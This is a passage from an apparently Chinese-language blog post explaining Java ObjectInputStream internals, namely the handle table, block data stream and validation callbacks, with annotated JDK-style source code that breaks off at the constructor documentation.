&lt;p&gt;对象的默认反序列化机制会把每个字段恢复为写出时的值与类型。</span></span><br><span class="line"><span class="comment"> * 被声明为 transient 或 static 的字段在反序列化过程中会被忽略。</span></span><br><span class="line"><span class="comment"> * 对其它对象的引用会在需要时递归读取，以恢复完整的对象图；</span></span><br><span class="line"><span class="comment"> * 共享引用会被正确还原。反序列化时总是分配新的对象实例，避免覆盖现有对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读取一个对象的过程类似于“运行新对象的构造过程”：</span></span><br><span class="line"><span class="comment"> * 会为对象分配内存并以零（或 NULL）初始化；对&lt;b&gt;不可序列化&lt;/b&gt;的超类会调用其</span></span><br><span class="line"><span class="comment"> * 无参构造方法；随后按层级从靠近 java.lang.Object 的可序列化类开始，</span></span><br><span class="line"><span class="comment"> * 一直到最具体的类，依次从流中恢复各层的字段。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;示例（读取由 ObjectOutputStream 示例写出的数据）：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *      FileInputStream fis = new FileInputStream(&quot;t.tmp&quot;);</span></span><br><span class="line"><span class="comment"> *      ObjectInputStream ois = new ObjectInputStream(fis);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      int i = ois.readInt();</span></span><br><span class="line"><span class="comment"> *      String today = (String) ois.readObject();</span></span><br><span class="line"><span class="comment"> *      Date date = (Date) ois.readObject();</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      ois.close();</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;类可通过实现 java.io.Serializable 或 java.io.Externalizable 来控制</span></span><br><span class="line"><span class="comment"> * 自身的序列化方式。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 Serializable 允许在保存/恢复对象全部状态的同时，支持类在写出与读入</span></span><br><span class="line"><span class="comment"> * 期间的演进（evolution）。序列化会自动遍历对象之间的引用，从而保存/恢复整个对象图。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在序列化/反序列化过程中需要特殊处理的可序列化类，应实现以下私有方法：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException;</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;readObject 负责使用对应 writeObject 写入到流中的数据，读取并恢复其</span></span><br><span class="line"><span class="comment"> * 所在&lt;b&gt;这一层类&lt;/b&gt;的状态；它无需关心其超类或子类的状态。</span></span><br><span class="line"><span class="comment"> * 恢复的方式是从 ObjectInputStream 读取每个字段的数据，并把它们赋给对象中</span></span><br><span class="line"><span class="comment"> * 对应的字段。读取原始类型数据可使用 DataInput 提供的方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;任何企图读取超出对应 writeObject 方法自定义数据边界的对象数据，都会抛出</span></span><br><span class="line"><span class="comment"> * OptionalDataException，且其中的 eof 字段值为 true。</span></span><br><span class="line"><span class="comment"> * 如果是“非对象读”（如按字节读或读原始类型）越过了分配的数据末尾，</span></span><br><span class="line"><span class="comment"> * 行为与到达流末尾一致：按字节读会返回 -1，原始类型读会抛 EOFException。</span></span><br><span class="line"><span class="comment"> * 若不存在对应的 writeObject 方法，则“默认序列化数据”的结束标志为该层数据的终点。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在 readExternal 方法内部发起的原始/对象读取调用，其行为相同——若流的位置</span></span><br><span class="line"><span class="comment"> * 已经位于对应 writeExternal 方法写入数据的末尾：对象读取会抛出</span></span><br><span class="line"><span class="comment"> * OptionalDataException 且 eof 为 true；按字节读返回 -1；原始类型读抛 EOFException。</span></span><br><span class="line"><span class="comment"> * 需要注意的是：对于使用旧协议</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;ObjectStreamConstants.PROTOCOL_VERSION_1&lt;/code&gt; 写入的流，该行为并不成立，</span></span><br><span class="line"><span class="comment"> * 因为该协议下 writeExternal 写入的数据结尾没有明确界定，因而无法检测。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;readObjectNoData 用于在反序列化流&lt;b&gt;并未&lt;/b&gt;把某个给定类列为所读对象的</span></span><br><span class="line"><span class="comment"> * 超类时，初始化该类自己的状态。这可能发生在接收方使用了不同版本的类定义，</span></span><br><span class="line"><span class="comment"> * 且接收方的版本继承了一些发送方版本未继承的类；也可能是序列化流被篡改所致。</span></span><br><span class="line"><span class="comment"> * 因此，readObjectNoData 有助于在“恶意或不完整”的来源流下仍正确初始化对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;对于未实现 java.io.Serializable 的任何对象，序列化并不会读取或赋值其字段。</span></span><br><span class="line"><span class="comment"> * 但“不可序列化类”的子类可以是可序列化的：此时，不可序列化的那个超类必须</span></span><br><span class="line"><span class="comment"> * 具有无参构造方法以便其字段能被初始化；同时由子类负责保存/恢复该不可序列化超类</span></span><br><span class="line"><span class="comment"> * 的状态。通常这些字段是可访问的（public/package/protected），或者可以通过</span></span><br><span class="line"><span class="comment"> * getter/setter 来恢复状态。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;反序列化对象时发生的任何异常都会被 ObjectInputStream 捕获并中止读取过程。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 Externalizable 允许对象完全控制其序列化形式的内容与格式：</span></span><br><span class="line"><span class="comment"> * 系统会分别调用 writeExternal 与 readExternal 来保存与恢复对象状态。</span></span><br><span class="line"><span class="comment"> * 当类实现了该接口后，它可以使用 ObjectOutput/ObjectInput 的所有方法读写自身状态，</span></span><br><span class="line"><span class="comment"> * 并由对象自己负责任何版本演进问题。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;枚举常量的反序列化与普通可序列化/可外部化对象不同：其序列化形式只包含</span></span><br><span class="line"><span class="comment"> * 常量名；常量的字段值不会被传输。反序列化时，ObjectInputStream 会从流中读取</span></span><br><span class="line"><span class="comment"> * 常量名，然后调用 &lt;code&gt;Enum.valueOf(Class, String)&lt;/code&gt; 以该枚举的基础类型</span></span><br><span class="line"><span class="comment"> * 与接收的常量名作为参数获得反序列化结果。与其它对象一样，枚举常量也可以作为</span></span><br><span class="line"><span class="comment"> * 随后出现的回引用（back reference）的目标。枚举常量的反序列化过程不可自定义：</span></span><br><span class="line"><span class="comment"> * 枚举类型中定义的 readObject、readObjectNoData、readResolve 方法都会被忽略；</span></span><br><span class="line"><span class="comment"> * 同样，serialPersistentFields 与 serialVersionUID 声明也会被忽略——</span></span><br><span class="line"><span class="comment"> * 所有枚举类型的 serialVersionUID 固定为 0L。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Mike Warres</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Roger Riggs</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.DataInput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Serializable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &lt;a href=&quot;../../../platform/serialization/spec/input.html&quot;&gt;</span></span><br><span class="line"><span class="comment"> *      Object Serialization Specification, Section 3, Object Input Classes&lt;/a&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectInputStream</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">InputStream</span> <span class="keyword">implements</span> <span class="title class_">ObjectInput</span>, ObjectStreamConstants</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="块输入流：BlockDataInputStream"><a href="#块输入流：BlockDataInputStream" class="headerlink" title="块输入流：BlockDataInputStream"></a>块输入流：BlockDataInputStream</h4><p>与 <code>BlockDataOutputStream</code> 对应，<code>BlockDataInputStream</code> 把“协议里的块数据”抽象为连续字节源；需要时切换“非块模式”读取类型码&#x2F;长度等结构化标记。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataInputStream bin;</span><br></pre></td></tr></table></figure></div>

<h4 id="对象句柄表：HandleTable"><a href="#对象句柄表：HandleTable" class="headerlink" title="对象句柄表：HandleTable"></a>对象句柄表：HandleTable</h4><p><code>ObjectInputStream</code> 在反序列化时会维护 <strong>wire handle（从 <code>0x7E0000</code> 起）→{对象 | 异常}</strong> 的映射及<strong>读取状态</strong>，从而确保正确实现 <code>TC_REFERENCE</code> 的回引、<strong>循环引用</strong>、以及异常传播。</p>
<p>维护上述内容的结构是对象句柄表 <code>HandleTable</code>。在该句柄表中，对象的状态有下面几种形式：</p>
<ul>
<li><code>UNREAD</code>：刚分配句柄，占位；</li>
<li><code>READING</code>：正在构造&#x2F;填充该对象（处理自引用&#x2F;循环引用时会先发句柄）；</li>
<li><code>DEFAULTED</code>：降级&#x2F;默认化（少见）；</li>
<li><code>OK</code>：完成，可正常回引。</li>
</ul>
<p>通过 <code>HandleTable</code>，我们可以确保循环引用的对象可以正常反序列化出来，例如：</p>
<p>当某对象 <code>A</code> 字段里引用了 <code>B</code>，而 <code>B</code> 又在构造中引用回 <code>A</code>：OIS 会先给 <code>A</code> 分配句柄并置 <code>READING</code>，构造 <code>A</code> 时读到 <code>B</code>，再为 <code>B</code> 分配句柄……当 <code>B</code> 里回引 <code>A</code> 时，通过 <code>TC_REFERENCE</code> 取到 <code>A</code> 的<strong>占位对象</strong>，从而闭环。</p>
<p><code>HandleTable</code> 的常见操作如下：</p>
<ul>
<li><code>assign(...)</code>：<strong>为“将要被读取的那个新对象”</strong>占个坑，返回它的句柄 <strong>H</strong>，状态置 <code>READING</code>（或实现里先 <code>UNREAD</code>，马上变 <code>READING</code>）。</li>
<li><code>markDependency(dependent, target)</code>：<strong>当前在读的对象（dependent&#x3D;父&#x2F;宿主）依赖 target（子&#x2F;被引用）</strong>。真正代码里“当前在读”的句柄就是 <code>passHandle</code>。</li>
<li><code>setObject(H, obj)</code>：把 <strong>H 这个坑里</strong>塞上<strong>最终对象</strong>。</li>
<li><code>setException(H, ex)</code>：把 <strong>H 这个坑</strong>标记成<strong>失败异常</strong>（根因）。</li>
<li><code>finish(H)</code>：把 <strong>H</strong> 的状态从 <code>READING</code> 收尾到 <code>OK</code>，并处理“等它的人”。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1) 为“将读的这个对象”先分配一个句柄 H</span></span><br><span class="line"><span class="type">int</span> <span class="variable">H</span> <span class="operator">=</span> handles.assign(unshared ? UNSHARED_SENTINEL : PLACEHOLDER);</span><br><span class="line"><span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> passHandle;            <span class="comment">// 记住老的“当前对象”</span></span><br><span class="line">passHandle = H;                     <span class="comment">// 现在 H 是“当前对象”</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 2) 读 classDesc，newInstance，准备字段访问器...</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> desc.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读各层 classdata（可能递归读很多“子对象”）</span></span><br><span class="line">    <span class="comment">//    期间每遇到一个“子对象/回引”，都会：</span></span><br><span class="line">    <span class="comment">//    - 为子对象 assign 子句柄 H_child</span></span><br><span class="line">    <span class="comment">//    - markDependency(H ← H_child)</span></span><br><span class="line">    <span class="comment">//    - 读完子对象后 setObject/finish(H_child)</span></span><br><span class="line">    readClassData(obj, desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 有 readResolve 就替换</span></span><br><span class="line">    obj = desc.maybeReadResolve(obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 当前对象成功落地</span></span><br><span class="line">    handles.setObject(H, obj);</span><br><span class="line">    handles.finish(H);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable cause) &#123;</span><br><span class="line">    <span class="comment">// 6) 当前对象失败，根因挂在 H 上，触发“依赖我”的一起失败</span></span><br><span class="line">    handles.setException(H, cause);</span><br><span class="line">    <span class="keyword">throw</span> abortWithWriteAborted(cause);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    passHandle = parent;            <span class="comment">// 恢复“当前对象”指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="对象图校验回调：ValidationList"><a href="#对象图校验回调：ValidationList" class="headerlink" title="对象图校验回调：ValidationList"></a>对象图校验回调：ValidationList</h4><p>在反序列化流程中，有些对象希望在 <strong>整个对象图构建完成后</strong> 再进行某些操作（例如不变量校验、反向索引恢复、跨引用修补等），这时可以调用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.registerValidation(ObjectInputValidation obj, <span class="type">int</span> priority);</span><br></pre></td></tr></table></figure></div>

<p>此时<strong>延迟回调</strong>会被登记到 <code>ObjectInputStream</code> 的一个内部队列 <code>ValidationList</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在“对象图返回给调用者之前”注册一个需要校验的对象（回调）。</span></span><br><span class="line"><span class="comment"> * 与 resolveObject 类似，但这些校验会在整个对象图完全重建之后才被调用。</span></span><br><span class="line"><span class="comment"> * 通常做法是：在某个类的 readObject 方法里把当前对象注册进流，</span></span><br><span class="line"><span class="comment"> * 等所有对象都恢复完成后，统一执行最后一组校验/修补逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  将要接收校验回调的对象（实现了 ObjectInputValidation）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> prio 回调优先级；0 是一个合适的默认值。</span></span><br><span class="line"><span class="comment"> *             数字越大越“早”执行，数字越小越“晚”执行；</span></span><br><span class="line"><span class="comment"> *             同一优先级内不保证执行顺序。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NotActiveException      当前流不处于“正在读取对象”的活动期，</span></span><br><span class="line"><span class="comment"> *                                 因而不允许注册（例如不在 readObject 调用栈中）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidObjectException  校验对象为 null 时抛出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerValidation</span><span class="params">(ObjectInputValidation obj, <span class="type">int</span> prio)</span></span><br><span class="line">    <span class="keyword">throws</span> NotActiveException, InvalidObjectException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// depth==0 表示不在任意 readObject 调用的活动期里（顶层计数器）</span></span><br><span class="line">    <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotActiveException</span>(<span class="string">&quot;stream inactive&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 交由内部的 ValidationList 以“按优先级降序”插入链表</span></span><br><span class="line">    vlist.register(obj, prio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在内部校验链表里登记回调节点。</span></span><br><span class="line"><span class="comment"> * 若回调对象为 null，抛出 InvalidObjectException。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ObjectInputValidation obj, <span class="type">int</span> priority)</span></span><br><span class="line">    <span class="keyword">throws</span> InvalidObjectException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;null callback&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以“优先级降序”插入到单链表中：</span></span><br><span class="line">    <span class="comment">// 当前节点 priority 越大，越靠前；同优先级下顺序不做保证。</span></span><br><span class="line">    <span class="type">Callback</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>, cur = list;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span> &amp;&amp; priority &lt; cur.priority) &#123;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 捕获当前的访问控制上下文（Java 安全管理/权限模型相关），</span></span><br><span class="line">    <span class="comment">// 以便将来在回调执行时沿用同一安全上下文。</span></span><br><span class="line">    <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> AccessController.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 prev 与 cur 之间插入新节点（或作为新表头）</span></span><br><span class="line">    <span class="keyword">if</span> (prev != <span class="literal">null</span>) &#123;</span><br><span class="line">        prev.next = <span class="keyword">new</span> <span class="title class_">Callback</span>(obj, priority, cur, acc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        list = <span class="keyword">new</span> <span class="title class_">Callback</span>(obj, priority, list, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对象图构建完毕后，<strong>一次性</strong>做收尾：建索引、补 transient 字段、做不变量校验等。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>); <span class="comment">// 真正读对象</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span>) &#123;                <span class="comment">// 最外层</span></span><br><span class="line">            vlist.doCallbacks();         <span class="comment">// 这里执行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidObjectException e) &#123;</span><br><span class="line">        <span class="comment">// 这是 validateObject 抛出的，直接向上抛</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) vlist.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>doCallbacks</code> 会按照优先级依次调用对象的 <code>validateObject</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 触发并执行所有已注册的校验回调，随后清空回调链表。</span></span><br><span class="line"><span class="comment"> * 优先级高的（数值大）先执行；同一优先级的执行顺序不承诺。</span></span><br><span class="line"><span class="comment"> * 若任意回调抛出 InvalidObjectException，则立刻终止后续回调，</span></span><br><span class="line"><span class="comment"> * 并将该异常向上抛出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">doCallbacks</span><span class="params">()</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 逐个消费链表头节点（链表在 register(...) 时已按“优先级降序”排好）</span></span><br><span class="line">        <span class="keyword">while</span> (list != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 以注册时捕获的 AccessControlContext（list.acc）作为权限上下文，</span></span><br><span class="line">            <span class="comment">// 在受控的特权块里执行回调；这里必须用 PrivilegedExceptionAction，</span></span><br><span class="line">            <span class="comment">// 因为 validateObject() 可能抛受检异常 InvalidObjectException。</span></span><br><span class="line">            AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">                        <span class="comment">// 真正执行校验</span></span><br><span class="line">                        list.obj.validateObject();</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// 使用登记回调时捕获的安全上下文，确保回调在与登记时相同的权限边界内运行</span></span><br><span class="line">                list.acc</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本节点执行完，指向下一个；逐步“消费”链表，成功路径下自然清空</span></span><br><span class="line">            list = list.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PrivilegedActionException ex) &#123;</span><br><span class="line">        <span class="comment">// 只有受检异常会被包装为 PrivilegedActionException；</span></span><br><span class="line">        <span class="comment">// 我们按约定仅传播 InvalidObjectException。</span></span><br><span class="line">        <span class="comment">// 同时将链表置空，确保“清空回调列表”的语义在异常路径也成立。</span></span><br><span class="line">        list = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">throw</span> (InvalidObjectException) ex.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将回调链表重置为初始的“空”状态。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">    list = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="ObjectInputStream-构造函数"><a href="#ObjectInputStream-构造函数" class="headerlink" title="ObjectInputStream 构造函数"></a>ObjectInputStream 构造函数</h3><p><code>ObjectInputStream</code> 同样有两类构造函数，这里直接看有参构造函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个从指定 &#123;<span class="doctag">@link</span> InputStream&#125; 读取的 &#123;<span class="doctag">@code</span> ObjectInputStream&#125;。</span></span><br><span class="line"><span class="comment"> * 构造时会立即从底层输入流读取并校验**序列化流头部（stream header）**。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * ⚠ 该构造函数在对端 &#123;<span class="doctag">@link</span> ObjectOutputStream&#125; 写出并 &lt;b&gt;flush()&lt;/b&gt; 头部之前会一直阻塞，</span></span><br><span class="line"><span class="comment"> * 因此基于套接字的场景下，发送端务必在构造 OOS 后立刻 flush。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;安全管理器（SecurityManager）说明：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * 若已安装 SecurityManager，且本构造函数被某“子类的构造器”直接或间接调用，</span></span><br><span class="line"><span class="comment"> * 并且该子类&lt;b&gt;重写&lt;/b&gt;了 &#123;<span class="doctag">@link</span> #readFields()&#125; 或 &#123;<span class="doctag">@link</span> #readUnshared()&#125; 等</span></span><br><span class="line"><span class="comment"> * 安全敏感方法，则需要具备</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> 